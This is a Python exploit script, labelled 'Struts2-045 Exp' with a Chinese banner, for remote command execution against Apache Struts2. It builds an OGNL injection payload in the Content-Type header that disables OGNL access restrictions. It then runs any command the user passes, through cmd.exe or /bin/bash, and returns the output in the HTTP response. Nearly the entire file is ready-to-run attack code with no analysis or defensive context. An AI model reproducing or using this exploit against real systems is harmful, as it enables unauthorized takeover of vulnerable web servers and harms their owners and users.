#!/usr/bin/env python3
# coding:'utf-8'
# Struts2-045 Exp
# Code by Aasron

import requests
import sys

print('s2-045漏洞利用脚本  '
      '#Code by Aasron'
)

def poc(url,cmd):
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"

    headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
    res = requests.get(url, headers=headers, verify=False)
    req = res.content.decode('utf-8')
    print(req)

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("python3 struts2-045.py url cmd")
        sys.exit()
    else:
        url = sys.argv[1]
        cmd = sys.argv[2]
        poc(url,cmd)
